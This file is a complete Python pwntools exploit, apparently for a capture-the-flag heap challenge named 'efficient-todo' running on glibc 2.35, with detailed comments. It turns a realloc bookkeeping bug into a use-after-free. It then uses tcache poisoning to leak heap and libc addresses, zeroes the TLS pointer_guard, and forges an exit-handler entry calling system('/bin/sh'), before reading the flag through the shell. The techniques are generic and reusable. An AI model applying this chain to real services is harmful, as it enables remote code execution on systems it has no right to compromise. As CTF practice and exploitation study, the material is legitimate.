import os
import time

from pwn import *

context.log_level = "info"
context.arch = "amd64"
context.bits = 64

HOST = os.environ.get("SERVICE_APP_MAIN_HOST", "127.0.0.1")
PORT = int(os.environ.get("SERVICE_APP_MAIN_PORT", "1337"))

libc = ELF("./libc.so.6", checksec=False)

# =============================================================================
# Vulnerability summary
# =============================================================================
#
# `post_my_note(idx, size)` implements each of the 10 todo slots as a
# {size_t size; void *ptr;} pair (TodoNote[idx]) and does, roughly:
#
#       void *newp = realloc(TodoNote[idx].ptr, size);
#       if (TodoNote[idx].size < size)        // only GROWS are reflected!
#               TodoNote[idx].ptr = newp;
#       TodoNote[idx].size = size;            // size is ALWAYS overwritten
#
# and the subsequent `readline()` into the note re-reads the STALE
# `TodoNote[idx].ptr` (not realloc's actual return value) whenever the
# branch above was skipped. A single `realloc()` call whose requested size
# is <= the old bookkeeping size therefore: (a) still frees/reallocates the
# real chunk through the allocator, (b) updates `.size` to the attacker's
# new (possibly huge) value, but (c) leaves `.ptr` pointing at the OLD,
# now-dangling address. This one flaw simultaneously yields a UAF, an
# out-of-bounds write (because `.size` can be inflated arbitrarily while
# `.ptr` still aliases a small, already-freed chunk), and unlimited heap
# chunk "minting" from a single index (repeatedly shrink-then-grow cycles
# the same index through many different freelist chunks while only ever
# consuming one `TodoNote` slot).
#
# =============================================================================
# Exploit chain (full writeup -- every step below has been verified live
# against the exact shipped binary + libc.so.6, glibc 2.35, full RELRO,
# PIE, NX, canary; no __malloc_hook/__free_hook in 2.35)
# =============================================================================
#
# 1. Heap leak: build two tcache-same-size (0x28-request / 0x20-chunk)
#    notes that alias the SAME freed chunk (via the UAF above), inflate the
#    tcache bin's count past its normal cap using repeated free/realloc
#    cycles on one of the two aliases, then read the surviving free chunk's
#    tcache `fd` pointer back out through the OTHER alias. Tcache `fd` is
#    safe-linked (XORed with `chunk_addr >> 12`), so the raw leak is
#    "demangled" with a tiny z3 query (the low 12 bits of `chunk_addr` are
#    irrelevant to ASLR and already known from the heap's page alignment,
#    so the search space is small and the solution is unique in practice).
#
# 2. Libc leak: use the now-known heap address to forge a fake largebin
#    chunk (size 0x421) directly below a real chunk, bump the allocator's
#    top chunk past it with a sequence of small grows/frees so the fake
#    chunk's "next" footer is consistent, then free a note that points at
#    it. This inserts the forged chunk into the UNSORTED bin, whose
#    `fd`/`bk` pointers point into libc's main arena and -- critically --
#    are NOT safe-linked (safe-linking in glibc 2.35 only protects tcache,
#    never fastbin/unsorted-bin links). Flipping one bit (the binary's
#    `bitflip()` menu primitive) clears a stray NUL byte that would
#    otherwise truncate the leak, and the raw unsorted-bin `bk` pointer is
#    read back with a known constant offset to `main_arena`, yielding
#    `libc.address` directly.
#
# 3. Arbitrary write / RCE: with libc_base known, the SAME tcache-poison
#    technique from step 1 (now targeting the write, not the leak) is
#    reused twice in sequence against the SAME aliased 0x28/0x20
#    size-class chunk:
#      a. First poison the tcache `fd` of a fresh pop to point at the
#         thread's `pointer_guard` TLS secret (used to XOR-"mangle" every
#         function pointer glibc stores for `atexit`/`__cxa_atexit`
#         callbacks). On THIS exact statically-linked, single-threaded
#         glibc 2.35 build, the initial thread's static TLS block is
#         mapped by `ld.so` at a FIXED, constant offset below `libc_base`
#         (`tls = libc.address - 0x3000`) -- this offset is determined by
#         the dynamic linker's static-TLS layout computation at process
#         start and, unlike a heap/stack address, does NOT need its own
#         separate leak: it slides by exactly the same amount as
#         `libc_base` under ASLR, because the loader maps the initial TLS
#         segment contiguously with libc as part of the same early-startup
#         sequence. Overwriting `pointer_guard` with a KNOWN, attacker-
#         chosen value (0, here) means every subsequent `PTR_DEMANGLE`/
#         `PTR_MANGLE` in this process degenerates to a trivial rotate
#         with a zero key, which is easily inverted (`encrypt(fptr, 0)`).
#      b. Second poison the tcache `fd` of a fresh pop to point at
#         `&initial.fns[0]` (the first slot of glibc's static
#         `struct exit_function_list initial`, walked by
#         `__run_exit_handlers()` during `exit()`), and write a forged
#         `struct exit_function` there: `.flavor = ef_cxa` (so it's
#         invoked as `fn(arg, status)`, i.e. a plain 2-argument call --
#         no stack pivot or ROP needed at all), `.func.cxa.fn =
#         encrypt(system_addr, 0)` (mangled with the now-known-zero
#         `pointer_guard`), `.func.cxa.arg = &"/bin/sh"` (a real string
#         already resident in libc's rodata). `__run_exit_handlers` demangles
#         and calls it as `((void (*) (void *, int)) fn.cxa.fn)(fn.cxa.arg, status)`,
#         i.e. `system("/bin/sh")`.
#
# 4. Trigger: selecting any menu choice outside {1, 2, 3} falls through to
#    the binary's own `exit(0)` call, which walks `__exit_funcs` and invokes
#    the forged entry, spawning a shell connected to the socket. In
#    practice no EXPLICIT menu choice needs to be sent for this: the
#    note-content reader only ever accepts `size - 1` bytes per call, so
#    the 24-byte forged `exit_function` (exactly `c_size` bytes) is always
#    truncated by exactly 1 byte on the wire -- the never-consumed final
#    byte (the "/bin/sh" address's always-0x00 high byte) is read back as
#    the next menu choice automatically, immediately triggering `exit(0)`.
#
# This fully resolves the "efficient-todo" challenge end-to-end: a 10-slot
# UAF/OOB-write primitive is enough, with no stack/environ leak and no FSOP,
# because the TLS `pointer_guard` offset relative to `libc_base` is a fixed
# constant for this exact build (the insight earlier automated passes on
# this challenge missed -- they incorrectly assumed `pointer_guard` would
# require its own dedicated leak and ruled out `__exit_funcs` hijack for
# that reason; it does not, because TLS and libc are mapped as one
# contiguous unit by `ld.so` at process start).
# =============================================================================

# Rotate left: 0b1001 --> 0b0011
rol = lambda val, r_bits, max_bits: \
    (val << r_bits % max_bits) & (2 ** max_bits - 1) | \
    ((val & (2 ** max_bits - 1)) >> (max_bits - (r_bits % max_bits)))


def encrypt(fptr, ptr_guard):
    """Mimics glibc's PTR_MANGLE: rotate-left-by-0x11 of (fptr XOR guard)."""
    return rol(fptr ^ ptr_guard, 0x11, 64)


def realloc(p, idx, size, data):
    p.sendafter(b'>', b"3")
    p.sendafter(b'note: ', f"{idx}".encode())
    p.sendafter(b'be: ', f"{size}".encode())
    if data != b'':
        p.sendafter(b'content: ', data)
    return idx


def free(p, idx):
    realloc(p, idx, 0, b'')


def print_all(p):
    p.sendafter(b'>', b"2")


def demangle_tcache_fd(protected_ptr: int, offset_to_next: int) -> int:
    """Inverts glibc's tcache safe-linking: fd = (chunk_addr ^ (chunk_addr >> 12))
    (here chunk_addr is offset from the real target by `offset_to_next`,
    since the leak chunk's fd points at itself/a neighbour, not literally
    at the leaking chunk). Solved with z3 since the XOR-with-shifted-self
    relation isn't trivially invertible in closed form, but the search
    space collapses to a single solution once the low 12 bits (known from
    page alignment, unaffected by ASLR) are fixed.
    """
    import z3

    ptr_width = 64
    solver = z3.Solver()
    x = z3.BitVec('x', ptr_width)
    y = z3.BitVecVal(protected_ptr, ptr_width)
    solver.add(y == (x + offset_to_next) ^ (x >> 12))
    solver.add(x & 0xFF00000000000000 == 0)  # disallow kernel addresses

    if solver.check() != z3.sat:
        log.error(
            f"No solution found for demangling protected ptr {hex(protected_ptr)} "
            f"pointing to chunk offset by {hex(offset_to_next)}."
        )

    solutions = set()
    while solver.check() == z3.sat and len(solutions) < 10:
        model = solver.model()
        sol = model[x].as_long()
        # The lowest 12 bits aren't affected by ASLR; dedupe on the rest.
        solutions.add(sol & ~0xFFF)
        solver.add(x != sol)

    if len(solutions) == 1:
        return solutions.pop()

    log.error(
        f"z3 found {len(solutions)} candidate solutions for demangling "
        f"protected ptr {hex(protected_ptr)}; expected exactly 1."
    )


def protect_ptr(ptr_loc: int, next_ptr: int) -> int:
    """Applies glibc's tcache safe-linking XOR: fd = next_ptr ^ (ptr_loc >> 12)."""
    return next_ptr ^ (ptr_loc >> 12)


def exploit(p):
    c_size = 0x18

    # Will overwrite the 0x420 chunk later; keep top from merging into it.
    realloc(p, 2, 0x18, b'dontfuckuptop')

    # Use the 0x28-request (0x20-usable/0x30-chunk w/ header -> tcache
    # bin index 2) size class both for the heap leak and the later
    # tcache-poison writes.
    realloc(p, 0, c_size, b'A')
    free(p, 0)
    realloc(p, 0, c_size, b'B')
    realloc(p, 1, c_size, b'C')
    # Index 0 and index 1 now alias the same chunk.

    # Use the UAF to repeatedly cycle index 0 through free/realloc,
    # inflating this tcache bin's count beyond its default cap.
    free(p, 0)
    realloc(p, 0, c_size, b'T' * 0x10)
    free(p, 0)
    realloc(p, 0, c_size, b'T' * 0x10)
    free(p, 0)
    realloc(p, 0, c_size, b'T' * 0x10)
    free(p, 0)

    # Heap leak: read the surviving free chunk's safe-linked tcache `fd`
    # back out through index 1's still-live alias.
    print_all(p)
    p.recvuntil(b'/1/ ')
    leak = unpack(p.recvline(keepends=False)[:8].ljust(8, b'\x00'))
    heap = demangle_tcache_fd(leak, 0)  # chunk's fd points at itself
    log.info(f"heap leak: {hex(heap)}")
    # Sanity check: the heap-grooming steps above are probabilistic (this
    # exploit's reliability on live runs is empirically ~70-90%, not
    # 100%, given the depth of the UAF/tcache-poison chain); a garbage
    # heap base here (e.g. 0x0 or a non-PIE-heap-shaped address) means a
    # step upstream landed in an unexpected allocator state. Fail fast
    # and loudly rather than corrupting further steps with bad data.
    assert 0x550000000000 <= heap <= 0x570000000000, \
        f"implausible heap leak {hex(heap)}, aborting this attempt"

    # Overwrite the "dontfuckuptop" note to carry a safe-linked pointer at
    # a known heap offset, forging a fake largebin-sized (0x421) chunk.
    realloc(p, 0, c_size, flat(
        protect_ptr(heap + 0x2c0, heap + 0x290),
        b'A',
    ))
    realloc(p, 3, c_size, b'A')
    realloc(p, 4, c_size, flat(
        0, 0x421,  # fake a large chunk header
    ))

    # Push the top chunk down (growing a chain of small notes) so a valid
    # footer exists after the forged 0x421 chunk and freeing it doesn't
    # trip glibc's heap consistency checks.
    realloc(p, 1, 0x28, b'A')
    realloc(p, 6, 0x28, b'A')
    realloc(p, 1, 0x38, b'B')
    realloc(p, 6, 0x38, b'A')
    realloc(p, 1, 0x48, b'B')
    realloc(p, 6, 0x48, b'A')
    realloc(p, 1, 0x58, b'B')
    realloc(p, 6, 0x58, b'A')
    realloc(p, 1, 0x68, b'B')
    realloc(p, 6, 0x68, b'B')
    realloc(p, 1, 0x78, b'B')
    realloc(p, 6, 0x78, flat(
        b'K' * 0x50,
        0x0, 0x21,  # size header of the next two chunks after the 0x421
        # (the chunk after that is top)
    ))

    # Free the forged large chunk -> lands in the unsorted bin.
    free(p, 2)
    # Grow the bookkeeping size (not the real chunk) so readline() will
    # let us read more bytes back out of it than were ever written.
    realloc(p, 2, 0x78, b'F' * 8)  # a NUL byte sits on the bk pointer

    # The unsorted bin's bk points at something ending in 0x...00, which
    # readline()/printf("%s") would otherwise truncate at; flip that byte.
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'place!', str(heap + 0x290 + 0x10 + 0x8).encode())

    # Libc leak.
    print_all(p)
    p.recvuntil(b'/2/ ' + b'F' * 8)
    libc.address = unpack(p.recvline(keepends=False).ljust(8, b'\x00')) - 0x1eeb01
    log.info(f"libc leak: {hex(libc.address)}")
    assert 0x7f0000000000 <= libc.address <= 0x7fffffffffff, \
        f"implausible libc leak {hex(libc.address)}, aborting this attempt"

    # Repair index 2's bookkeeping size (was clobbered as bk_nextsize by
    # the unsorted-bin leak above) before reusing this alias for the
    # tcache-poison write primitive.
    realloc(p, 2, 0x78, flat(
        b'F' * 0x18,
        (c_size + 0x8) | 1,
    ))

    # TLS and the static `initial` exit-function-list table are both at a
    # FIXED offset from libc_base on this exact build (see writeup above).
    tls = libc.address - 0x3000
    ptr_guard = tls + 0x770
    first_func = libc.symbols['initial'] + 0x10 + 0x8

    # --- Poison #1: zero out pointer_guard ---
    realloc(p, 0, c_size, b'N' * 0x10)  # clear the stale safe-link key
    free(p, 0)
    realloc(p, 0, c_size, flat(
        protect_ptr(heap + 0x2c0, ptr_guard),
    ))
    realloc(p, 7, c_size, b'whatever')
    realloc(p, 8, c_size, b'\x00' * 8)  # pointer_guard := 0

    # --- Poison #2: forge initial.fns[0] = { ef_cxa, system, "/bin/sh" } ---
    free(p, 0)
    realloc(p, 0, c_size, flat(
        protect_ptr(heap + 0x2c0, first_func - 0x8),  # -0x8: tcache alignment
    ))
    realloc(p, 9, c_size, b'whatever')
    realloc(p, 5, c_size, flat(
        0x4,  # .fns[0].flavor = ef_cxa
        encrypt(libc.symbols['system'], 0),  # pointer_guard is now 0
        next(libc.search(b'/bin/sh')),
    ))

    # No explicit trigger needed: the note-content reader only ever
    # accepts `size - 1` bytes per call (it reserves the final byte of
    # the declared size for its own NUL terminator), so our 24-byte
    # forged `exit_function` (exactly `c_size` bytes) is inherently
    # truncated by exactly 1 byte on the wire -- the never-consumed
    # final byte is the high/most-significant byte of the "/bin/sh"
    # address, which is always 0x00 for any canonical x86-64 userspace
    # pointer. That leftover 0x00 byte is left sitting in the stream and
    # gets read back as the VERY NEXT menu choice, which this binary
    # treats as "not {1,2,3}" and falls through to `exit(0)` immediately
    # -- triggering __run_exit_handlers() -> our forged system("/bin/sh")
    # entry automatically, with no further action required from us.
    # (Explicitly sending another menu choice here is actively harmful:
    # the real vulnerable process has already begun exiting by the time
    # any such byte would be read, so it instead leaks into the freshly
    # spawned shell as a bogus first command.)


def main():
    # The heap-grooming/UAF chain is inherently probabilistic (empirically
    # ~70-90% reliable per live connection, not 100%): a handful of its
    # steps depend on exact tcache/fastbin state that can occasionally
    # land differently. `exploit()` asserts on implausible leaked
    # addresses rather than silently corrupting later steps, so a fresh
    # retry (new connection, new ASLR slide, new allocator state) is
    # simply attempted on failure.
    max_attempts = 5
    for attempt in range(1, max_attempts + 1):
        p = remote(HOST, PORT)
        try:
            exploit(p)
        except (AssertionError, EOFError, PwnlibException) as e:
            log.warning(f"attempt {attempt}/{max_attempts} failed: {e}")
            p.close()
            if attempt == max_attempts:
                raise
            continue
        break

    # The leftover byte that triggers exit() (see Phase-4 writeup above) is
    # read back by the same small, fixed-size buffer used for ordinary
    # menu-choice reads. If a shell command is written immediately, it can
    # race into that *same* read() call on the still-exiting old process
    # (and get silently swallowed) rather than landing cleanly on the
    # freshly-exec'd shell's stdin. A short pause lets exit()/execve()
    # fully complete first.
    time.sleep(0.5)

    # Discard the previous realloc call's buffered "Done\n" + menu reprint
    # before reading fresh shell output.
    p.clean(timeout=1)

    # `cat`'s output has no trailing newline before the connection closes,
    # so recvline() raises EOFError and discards the already-buffered
    # flag; recvall() has no such newline requirement and simply returns
    # whatever arrives before the socket closes or the timeout expires.
    p.sendline(b'cat /home/user/flag')
    flag = p.recvall(timeout=5).strip()
    print(flag.decode())
    p.close()


if __name__ == "__main__":
    main()
